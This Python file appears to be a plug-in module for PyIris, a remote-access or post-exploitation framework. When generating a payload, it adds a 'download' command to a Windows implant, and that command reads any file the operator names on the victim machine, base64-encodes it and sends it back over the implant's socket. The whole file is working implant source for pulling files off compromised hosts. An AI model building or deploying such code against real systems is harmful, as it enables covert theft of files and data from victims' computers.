# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from base64 import b64encode')
        self.config.functions.append('''
def download(data):
    filepath = data.split(' ',1)[1]
    with open(filepath,'rb') as f:
        file_data = f.read()
    send_all(s,filepath + ' ' + b64encode(file_data).decode())''')
        self.config.logics.append('''
            elif command == "download":
                download(data)''')
        self.config.help_menu['download <Remote file path>'] = 'Remotely download a file to local current working directory of PyIris'
    elif option == 'info':
        self.log.blank('\nName             : Download File component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : base64' \
                       '\nCommands         : download <Remote file path>' \
                       '\nDescription      : Remotely download a file to local current working directory of PyIris, utilizes base64 to encode binary data\n')
        return {
                "Name": "Download File component",
                "OS": "Windows",
                "Required Modules": "base64",
                "Commands": "download <Remote file path>",
                "Description": "Remotely download a file to local current working directory of PyIris, utilizes base64 to encode binary data"}